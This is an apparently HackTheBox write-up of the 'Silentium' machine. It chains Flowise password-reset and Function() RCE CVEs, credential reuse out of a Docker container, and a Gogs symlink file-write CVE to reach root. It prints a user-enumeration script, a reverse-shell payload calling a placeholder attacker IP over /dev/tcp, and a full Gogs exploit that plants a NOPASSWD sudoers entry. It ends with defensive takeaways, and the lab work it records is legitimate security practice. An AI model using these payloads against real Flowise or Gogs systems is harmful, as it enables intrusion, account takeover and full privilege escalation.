---
title: "Silentium"
date: 2026-06-24
categories: [HackTheBox, Easy]
tags: [linux, fuzzing, flowise, CVE, CVE-2025-58434, CVE-2025-59528, container escape, scripting, ssh port forward, gogs, symlink, sudoers]
image:
  path: /assets/img/HTB/Silentium/banner.png
  alt: Silentium writeup
protected: true
---


Three chained CVEs and a credential-reuse container escape. Flowise 3.0.5 exposes a username-enumeration oracle that reveals `ben@silentium.htb`; **CVE-2025-58434** (broken password-reset flow) hands over that account; **CVE-2025-59528** (CustomMCP node evaluating user input through `Function()`) yields RCE as root inside a Docker container. Credential reuse on `SMTP_PASSWORD` lets `ben` SSH into the host, and **CVE-2025-8110** (Gogs arbitrary file write via symlink) — running locally as root and reached through a port-forward — drops a `NOPASSWD: ALL` sudoers entry to finish at root.

| Field      | Details             |
|------------|---------------------|
| Platform   | HackTheBox          |
| Difficulty | Easy                |
| OS         | Linux               |
| IP         | 10.129.30.173       |
| Date       | June 2026           |

## Tools Used

| Tool                       | Description                                                                                  |
|----------------------------|----------------------------------------------------------------------------------------------|
| nmap                       | Network port scanner and service fingerprinter                                               |
| gobuster (dns mode)        | DNS subdomain brute-forcing against the `silentium.htb` zone                                 |
| Browser DevTools           | Network tab analysis to discover API endpoints and error-message-based oracles               |
| Python3                    | Custom user-enumeration script and Gogs exploit                                              |
| curl                       | Manual exploitation of the Flowise CustomMCP RCE endpoint                                    |
| netcat (nc)                | Reverse-shell listener                                                                       |
| ssh (-L)                   | Local port forward to reach the internal Gogs instance on the host                           |
| git                        | Required by the Gogs exploit to push the malicious symlink commit                            |

## Reconnaissance & Enumeration

The objective of this phase was to enumerate exposed services and identify the application stack worth attacking.

### Host Discovery

Connectivity was confirmed with ICMP. The TTL of 63 (default Linux TTL is 64, decremented once across the routing hop) gave the usual OS hint:

```bash
ping -c 1 10.129.30.173
PING 10.129.30.173 (10.129.30.173) 56(84) bytes of data.
64 bytes from 10.129.30.173: icmp_seq=1 ttl=63 time=47.7 ms
```

### Port Scan

A SYN scan across all 65535 TCP ports at a high packet rate, with `-Pn` skipping host discovery and `-n` disabling reverse DNS:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n 10.129.30.173 -oG allPorts
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

A targeted scan with default scripts and version detection followed:

```bash
sudo nmap -p22,80 -sCV 10.129.30.173 -oN nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
```

The HTTP server responded with a redirect to `http://silentium.htb/`, signalling name-based virtual hosting. The domain was added to `/etc/hosts`:

```bash
echo "10.129.30.173 silentium.htb" | sudo tee -a /etc/hosts
```

### Web Application — Dead End on the Apex

Browsing to `http://silentium.htb/` returned a static landing page with no obvious entry points: no login form, no admin path, no version banner. Standard content discovery (`gobuster dir`, `feroxbuster`) didn't surface anything either. With the apex producing nothing, the natural next move was to assume the interesting application was on a sibling **subdomain**.

### Subdomain Enumeration

`gobuster` in DNS mode iterates a subdomain wordlist against the configured nameserver, resolving each candidate as `<word>.silentium.htb`:

```bash
sudo gobuster dns --domain silentium.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] Domain:     silentium.htb
[+] Threads:    10
[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
staging.silentium.htb ::ffff:10.129.30.173
Progress: 1044 / 5000 (20.88%)^C
```

A `staging.silentium.htb` subdomain resolved to the same IP. Added to `/etc/hosts`:

```bash
echo "10.129.30.173 staging.silentium.htb" | sudo tee -a /etc/hosts
```

### Identifying Flowise

`http://staging.silentium.htb/` redirected to `/signin` and showed a login form with no overt version banner. The product had to be identified from secondary signals. The HTML referenced a versioned Vite-built JS bundle (`/assets/index-C6GKaUTA.js`), and inspecting the bundle revealed API endpoints under `/api/v1/...` with strings clearly belonging to **Flowise**, the open-source LLM-flow builder.

Confirming the exact version was a one-liner against an unauthenticated endpoint exposed by Flowise:

```bash
curl -s http://staging.silentium.htb/api/v1/version
{"version":"3.0.5"}
```

**Flowise 3.0.5** is the highest vulnerable version for two distinct issues weaponizable as a chain:

- **CVE-2025-58434** — a broken password-reset flow that returns a one-time `tempToken` inline in the response body of `/api/v1/account/forgot-password`, allowing any unauthenticated attacker to take over any registered account whose email they know.
- **CVE-2025-59528** — a code-execution flaw in the `CustomMCP` node where the `mcpServerConfig` field is parsed by passing the string through the JavaScript `Function()` constructor without sanitisation, yielding RCE under the Node.js process privileges.

The first turns *knowing an email* into *full account takeover*; the second turns *authenticated session* into *arbitrary code execution*. The only missing piece was a valid email address.

## Exploitation

### Username Enumeration via Login Response Oracle

Testing a random email in the login form produced a revealing error:

![Sign-In page returning 'User Not Found' for non-existent accounts](/assets/img/HTB/Silentium/cap1.png)

The `POST /api/v1/auth/login` endpoint distinguishes between *unknown email* and *wrong password*. Submitting `test@test.com` returned `User Not Found`; an existing email with a wrong password would presumably return something like `Invalid Password`. That distinction is a classic **username-enumeration oracle**: a response-content difference between *user does not exist* and *user exists, credential wrong* lets an attacker iterate a wordlist and learn which accounts actually exist on the system.

The login is JSON-based, so a small Python script using `requests` is the right tool. Since the SMTP banners and the FreePBX-style hints all pointed to email addresses under `@silentium.htb`, the script appends that domain to each candidate username and breaks on the first response that does *not* contain `User Not Found`:

```python
#!/usr/bin/env python3
import requests

TARGET = "http://staging.silentium.htb/api/v1/auth/login"
WORDLIST = "/usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt"


def make_request(session, word):
    word = word.strip()
    if not word:
        return None

    json_data = {
        "email": f"{word}@silentium.htb",
        "password": "test"
        }

    resp = session.post(TARGET, json=json_data, timeout=5)
    return resp

def is_valid(resp, word):
    if "User Not Found" not in resp.text:
        return True
    return False

def main():
    session = requests.Session()
    session.headers.update({
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    })

    with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as f:
        for i, line in enumerate(f):
            word = line.strip()
            if not word:
                continue

            try:
                resp = make_request(session, word)

                if is_valid(resp, word):
                    print(f"    Valid User: {word}")
                    break

            except requests.RequestException as e:
                print(f"[-] Error en {word}: {e}")

if __name__ == "__main__":
    main()
```

Running it against `xato-net-10-million-usernames.txt` (one of the most common username wordlists in SecLists, sorted by frequency) found a hit almost immediately:

```bash
python3 userEnum.py
    Valid User: ben
```

The first valid account was **`ben`**, almost certainly resolving to `ben@silentium.htb`.

### CVE-2025-58434 — Password Reset Token Leak

The public PoC by `nltt0` exploits the broken reset flow in two requests. First it calls `POST /api/v1/account/forgot-password` with the target email; the vulnerable Flowise version returns the supposedly-private `tempToken` inline in the JSON response body (instead of mailing it). Then it calls `POST /api/v1/account/reset-password` with `email + tempToken + newPassword`, and Flowise applies the change. The whole thing is single-shot:

```bash
python3 exploit.py -e ben@silentium.htb -p ben -u http://staging.silentium.htb/

                by nltt0

[x] Password changed
```

Logging in via the web UI as `ben:ben` worked. The dashboard exposed a number of Flowise admin features, including an **API Keys** section with a pre-existing key:

![Flowise admin panel showing the DefaultKey API key](/assets/img/HTB/Silentium/cap2.png)

```text
DefaultKey: hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc
```

### CVE-2025-59528 — CustomMCP RCE via `Function()` Constructor

The second Flowise CVE is fundamentally about how the `CustomMCP` node parses its configuration. The node receives a string in `mcpServerConfig` describing how to connect to an external Model Context Protocol server, and Flowise needs to turn that string into a JavaScript object. The shortest path between *a JavaScript-looking string* and *a JavaScript object* in Node is the **`Function()` constructor**, which compiles its argument as source code and returns a callable. The vulnerable implementation does literally:

```javascript
new Function('return ' + inputString)()
```

…where `inputString` is the user-supplied `mcpServerConfig`. There is no sandboxing — the constructed function runs in the same Node.js global scope as the rest of Flowise, with access to `require`, `process`, the filesystem, and `child_process`. Any object-literal-looking string can therefore embed an IIFE that calls `require('child_process').execSync(...)` as a side effect of "evaluating to an object".

The target endpoint is `POST /api/v1/node-load-method/customMCP`. Two operational details matter:

- The endpoint requires an authenticated Flowise session, not just the API key — so the exploit needs to log in first via `/api/v1/auth/login` and reuse the resulting cookies.
- The endpoint also checks the `x-request-from` header and only accepts requests claiming to come from `internal`. Adding `x-request-from: internal` to the request satisfies this trivial gate.

A reverse-shell listener was started:

```bash
nc -nlvp 5555
Listening on 0.0.0.0 5555
```

Then the login was driven via curl to capture session cookies into a jar:

```bash
curl -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"ben"}' \
  -c /tmp/cookies.txt
```

The payload was prepared in a JSON file to avoid quote-escaping hell on the shell. The string passed as `mcpServerConfig` is *syntactically* an object literal `({x: ...})`, but its only field `x` is initialised by an IIFE that calls `child_process.execSync` to spawn a bash reverse shell back to the listener — the side effect is what wins:

```json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require('child_process');cp.execSync('bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1\"');return 1;})()})"
  }
}
```

Firing the request with the captured cookies and the internal-routing header triggered the callback:

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -b /tmp/cookies.txt \
  -d @/tmp/payload.json
```

The listener received a shell as `root` — or what looked like root. The handful of running processes and the unfamiliar filesystem layout said otherwise.

## Container Escape — Credential Reuse

A `ps` listing immediately raised suspicion: the process table contained essentially only the Flowise Node process and the shell itself. No `systemd`, no `cron`, no SSH daemon. Combined with what looked like a generic Linux directory tree, the signal was unmistakable — this wasn't the host, it was a **Docker container**. The `env` dump confirmed it:

```bash
env
FLOWISE_PASSWORD=F1l3_d0ck3r
HOSTNAME=c78c3cceb7ba
NODE_VERSION=20.19.4
SMTP_PORT=1025
HOME=/root
SENDER_EMAIL=ben@silentium.htb
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
FLOWISE_USERNAME=ben
SMTP_PASSWORD=r04D!!_R4ge
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
[...]
```

Two giveaways nail the container:

- **`HOSTNAME=c78c3cceb7ba`** is a 12-character hexadecimal string — the canonical short form of a Docker container ID. Real hosts almost never have hostnames like this.
- **`SMTP_HOST=mailhog`** points to an internal service name that only resolves inside a Docker Compose network.

The `env` dump also leaked an unusual number of secrets — JWT signing keys, application passwords, SMTP credentials. Two of those looked like candidates for credential reuse against the host's SSH service:

- `FLOWISE_PASSWORD=F1l3_d0ck3r` — wordplay-style, application-flavoured.
- `SMTP_PASSWORD=r04D!!_R4ge` — leetspeak, generic, very password-y.

Testing the SMTP password against SSH as the `ben` user — chosen because `FLOWISE_USERNAME=ben` and `SENDER_EMAIL=ben@silentium.htb` both pointed at that account — landed:

```bash
ssh ben@silentium.htb
ben@silentium.htb's password: r04D!!_R4ge
ben@silentium:~$
```

This is the foothold proper: a shell on the actual host, not on the containerised Flowise instance. The user flag was readable from `ben`'s home directory:

```bash
cat /home/ben/user.txt
```

## Privilege Escalation — `ben` → `root`

With a shell as `ben` on the host, the standard enumeration began. `sudo -l` returned nothing, no SUID anomalies showed up, and `find` over typical writable-as-ben paths produced no usable leads. The breakthrough came from `ps -aux`:

```bash
ps -aux | grep -i gogs
root     1496  0.0  1.7 1664680 69152 ?       Ssl  12:48   0:01 /opt/gogs/gogs/gogs web
```

**Gogs** — a self-hosted Git service — was running **as root**, which is itself a configuration mistake but explains the privesc opportunity directly. The version banner pinned the exact build:

```bash
/opt/gogs/gogs/gogs -v
Gogs version 0.13.3
```

Gogs 0.13.3 is affected by **CVE-2025-8110**, an arbitrary file write via symlink that lets any authenticated user write to *any* path the Gogs process can access — and since Gogs is running as root, that means anywhere on the filesystem.

### Locating the Gogs Listener

Gogs's default web port is 3000, but a direct browser visit to `http://silentium.htb:3000/` failed because no port other than 22 and 80 had been exposed externally. `ss -nltp` from the box revealed where Gogs was actually listening:

```bash
ss -nltp
State    Recv-Q   Send-Q   Local Address:Port    Peer Address:Port
LISTEN   0        4096     127.0.0.1:1025        0.0.0.0:*
LISTEN   0        4096     127.0.0.1:8025        0.0.0.0:*
LISTEN   0        4096     127.0.0.1:42687       0.0.0.0:*
LISTEN   0        4096     127.0.0.1:3001        0.0.0.0:*
LISTEN   0        4096     127.0.0.1:3000        0.0.0.0:*
```

Two candidates were bound to localhost — 3000 and 3001. Port 3000 turned out to be Flowise's internal port (the container reverse-proxies onto 80 via nginx), while **3001 was the Gogs web UI**. Both bound to `127.0.0.1` only, meaning they were unreachable from the network without a tunnel.

### SSH Local Port Forward

`ssh -L` forwards a local port on the attacker box to an address-and-port reachable from the SSH server's perspective. Pointing it at `127.0.0.1:3001` on the target makes Gogs reachable on the attacker's `127.0.0.1:8080`:

```bash
ssh -L 8080:127.0.0.1:3001 ben@silentium.htb -N
```

`-N` tells ssh not to execute any remote command — it just sets up the forward and stays alive. Browsing to `http://127.0.0.1:8080/` from the attacker box loaded the Gogs UI directly.

### Manual Registration

Gogs is configured to allow self-registration. A user `monre` was registered via the web UI (the captcha forces this step to be manual rather than scripted) and a new repository created under that user:

![Gogs registration form](/assets/img/HTB/Silentium/cap3.png)

The repo view in Gogs confirmed something useful for the exploit — the clone URL shown by Gogs is `http://staging-v2-code.dev.silentium.htb`, which means the Gogs `ROOT_URL` is configured to that hostname:

![Gogs repository view showing the configured ROOT_URL](/assets/img/HTB/Silentium/cap4.png)

That URL is what Gogs returns in API responses (the response to the exploit's commit will show `staging-v2-code.dev.silentium.htb:3001` in the `commit.url` field), but Gogs itself doesn't enforce a Host-header check on incoming requests, so the exploit can target the tunnelled `127.0.0.1:8080` directly.

### CVE-2025-8110 — Arbitrary File Write via Symlink

The flaw lives in how Gogs handles file *updates* through its REST API. When a repository file is updated via `PUT /api/v1/repos/<owner>/<repo>/contents/<path>`, Gogs writes the new content to the resolved filesystem path. If the file under `<path>` is a **symbolic link**, Gogs follows the link before writing — meaning the write lands at the link's target rather than inside the repository working tree. Combine that with the fact that Gogs is running as root, and you have an arbitrary file write to any path on the filesystem.

The published PoC by `zAbuQasem` writes a generic file; the modification adapted it to write a sudoers drop-in file granting `ben` `NOPASSWD: ALL`. The chain of steps the script performs:

1. Log in as the freshly-registered Gogs user.
2. Generate an API access token (Gogs requires a token, not session cookies, for the file-content API).
3. Create a repository via the API.
4. Clone the repo locally, add a **symlink** named `malicious_link` pointing to `/etc/sudoers.d/ben`, commit and push.
5. Issue a `PUT` to `/api/v1/repos/<user>/<repo>/contents/malicious_link` with a base64-encoded sudoers entry as the new content. Gogs follows the symlink while writing, and the content lands at `/etc/sudoers.d/ben` — as root.

Full modified script:

```python
#!/usr/bin/env python3
"""
CVE-2025-8110 - Gogs Arbitrary File Write via symlink
Sin dependencias externas - solo stdlib + requests
"""

import argparse
import requests
import os
import subprocess
import shutil
import base64
import re
import urllib3
from urllib.parse import urlparse

urllib3.disable_warnings()

USERNAME = "monre"
PASSWORD = "monre123"
EMAIL = "monre@monre.com"
REPO = "monre"


def extract_csrf(html):
    match = re.search(r'<input[^>]+name="_csrf"[^>]+value="([^"]+)"', html)
    if not match:
        match = re.search(r'<input[^>]+value="([^"]+)"[^>]+name="_csrf"', html)
    if not match:
        raise ValueError("CSRF token not found")
    return match.group(1)

def login(session, base_url):
    url = f"{base_url}/user/login"
    resp = session.get(url)
    csrf = extract_csrf(resp.text)
    data = {
        "_csrf": csrf,
        "user_name": USERNAME,
        "password": PASSWORD,
    }
    resp = session.post(url, data=data, allow_redirects=True)
    if "user/login" in resp.url:
        raise ValueError("Login fallido")
    print("[+] Login correcto")


def get_token(session, base_url):
    url = f"{base_url}/user/settings/applications"
    resp = session.get(url)
    csrf = extract_csrf(resp.text)
    data = {"_csrf": csrf, "name": os.urandom(8).hex()}
    resp = session.post(url, data=data, allow_redirects=True)

    match = re.search(r'<div class="ui info message">\s*<p>([^<]+)</p>', resp.text)
    if not match:
        raise ValueError("Token no encontrado")
    token = match.group(1).strip()
    print(f"[+] Token: {token}")
    return token


def create_repo(session, base_url, token):
    api = f"{base_url}/api/v1/user/repos"
    data = {"name": REPO, "auto_init": True}
    resp = session.post(
        api,
        json=data,
        headers={"Authorization": f"token {token}"}
    )
    print(f"[+] Repo creado: {REPO} (status {resp.status_code})")


def upload_symlink(base_url):
    repo_dir = f"{REPO}"
    parsed = urlparse(base_url)
    clone_url = f"{parsed.scheme}://{USERNAME}:{PASSWORD}@{parsed.netloc}/{USERNAME}/{REPO}.git"

    if os.path.exists(repo_dir):
        shutil.rmtree(repo_dir)

    subprocess.run(["git", "clone", clone_url, repo_dir], check=True)

    # Symlink apunta a sudoers en la máquina víctima
    os.symlink("/etc/sudoers.d/ben", os.path.join(repo_dir, "malicious_link"))

    subprocess.run(["git", "add", "malicious_link"], cwd=repo_dir, check=True)
    subprocess.run(["git", "commit", "-m", "Add symlink"], cwd=repo_dir, check=True)
    subprocess.run(["git", "push", "origin", "master"], cwd=repo_dir, check=True)
    print("[+] Symlink subido")


def exploit(session, base_url, token):
    # Payload: ben puede ejecutar sudo sin contraseña
    payload = "ben ALL=(ALL) NOPASSWD: ALL\n"
    api = f"{base_url}/api/v1/repos/{USERNAME}/{REPO}/contents/malicious_link"
    data = {
        "message": "exploit",
        "content": base64.b64encode(payload.encode()).decode(),
    }
    resp = session.put(
        api,
        json=data,
        headers={"Authorization": f"token {token}"},
    )
    print(f"[+] Exploit enviado (status {resp.status_code})")
    print(f"    Response: {resp.text[:200]}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="URL de Gogs (ej: http://127.0.0.1:8080)")
    args = parser.parse_args()

    session = requests.Session()
    session.verify = False

    login(session, args.url)
    token = get_token(session, args.url)
    create_repo(session, args.url, token)
    upload_symlink(args.url)
    exploit(session, args.url, token)

    print("\n[*] Ahora en la máquina HTB ejecuta:")
    print("    sudo su -")


if __name__ == "__main__":
    main()
```

The two non-obvious design decisions in this modified version are:

- **The symlink target is `/etc/sudoers.d/ben`, not `/etc/sudoers`.** Dropping a new file into `/etc/sudoers.d/` is functionally equivalent to extending `/etc/sudoers` (the latter `@includedir`s the former) but it sidesteps the `visudo` syntax check that `/etc/sudoers` itself runs on edit — a single malformed line in the master sudoers file would lock everyone out, while a malformed drop-in is silently ignored.
- **The payload is sent as the new content of the existing `malicious_link` entry.** The symlink was committed in step 4 with a meaningless target file, then step 5 *updates* it via the API. Gogs's symlink-following happens in the update path, which is what the CVE exploits — pushing the content directly via git would not trigger it.

Running the script against the tunnel:

```bash
python3 privEsc.py -u http://127.0.0.1:8080
[+] Login correcto
[+] Token: 59f093d7e27a704917374aa051442b0be48a6788
[+] Repo creado: monre (status 422)
Clonando en '/tmp/monre'...
[master 2041c0e] Add symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
[...]
To http://127.0.0.1:8080/monre/monre.git
   c0dd920..2041c0e  master -> master
[+] Symlink subido
[+] Exploit enviado (status 201)
    Response: {"commit":{"url":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/monre/monre/contents/malicious_link",...}

[*] Ahora en la máquina HTB ejecuta:
    sudo su -
```

The `201 Created` status confirms Gogs wrote the new file content — which, because of the symlink, landed at `/etc/sudoers.d/ben`. The `commit.url` in the response shows `staging-v2-code.dev.silentium.htb:3001` because Gogs constructs response URLs from its configured `ROOT_URL`, not from the request's Host header. Status `422` from `create_repo` is benign — it means the repo already existed from a previous run, and the script idempotently continues.

Back on the host SSH session, `sudo` now accepts the previously-rejected privilege escalation without prompting for a password:

```bash
sudo su -
root@silentium:~# cat /root/root.txt
```

## Flags

| Flag     | Value      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Key Takeaways

- **Response-text differences are oracles.** A login form that says `User Not Found` for unknown emails and something else for known emails is leaking the validity of every email an attacker submits. The fix is universal "invalid email or password" responses — and timing-equalised handling on the backend, because even when the message is generic, a measurable timing difference between *bcrypt was run* and *bcrypt was skipped* leaks the same bit.
- **`new Function(userInput)` is `eval()` with extra steps.** Any code path that compiles user-controlled data into JavaScript and runs it is a remote code execution waiting to happen, regardless of how innocuous the *intended* shape of the data is. JSON parsing has `JSON.parse` for a reason. CVE-2025-59528 is the textbook example of the same anti-pattern that has produced RCEs in countless template engines, configuration loaders, and ORM filter chains over the years.
- **`env` is the first stop after any RCE.** Container environments stuff secrets into environment variables as a deployment convenience, which means the very first thing an attacker should do after gaining code execution in a container is dump `env`. JWT signing keys, database credentials, SMTP passwords, internal-API tokens, cloud-provider access keys — all of it ends up in there, and credential reuse against the host's SSH service is the easiest container-to-host pivot available.
- **Service ports bound to localhost are reachable through any SSH session.** `ssh -L` makes a "private" internal port indistinguishable from a public one as far as exploitation tooling is concerned. The lesson for defenders is that "localhost-only" is not a security control for any user who already has SSH on the host — it just slows down the attacker by one minute.
- **Symlinks remain a uniquely effective filesystem write primitive.** CVE-2025-8110 is the latest in a long line of "X follows symlinks when it shouldn't" CVEs (tarfile/CVE-2025-4517, Python's zipfile, every shared `/tmp` race) precisely because the abstraction is so leaky: code that reasons in terms of "filenames" almost always means "the file content at that name", and the OS doesn't distinguish a write-through-symlink from a direct write at the syscall layer. Code that handles user-controlled paths should always resolve them with `O_NOFOLLOW` or equivalent before writing.
